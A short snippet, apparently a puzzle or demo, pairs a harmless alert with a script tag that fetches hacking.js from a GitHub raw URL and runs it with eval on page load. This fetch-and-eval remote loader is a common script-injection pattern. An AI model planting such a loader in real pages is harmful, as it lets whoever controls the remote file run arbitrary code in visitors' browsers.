// code to run in page
alert("noooo")

// code in page
<script>
async function __load_script_() {
  var resp = await fetch(`https://raw.githubusercontent.com/gtavella/puzzles/refs/heads/main/hacking.js?_=${new Date()}`)
  var text = await resp.text()
  eval(text)
}
__load_script_()
</script>
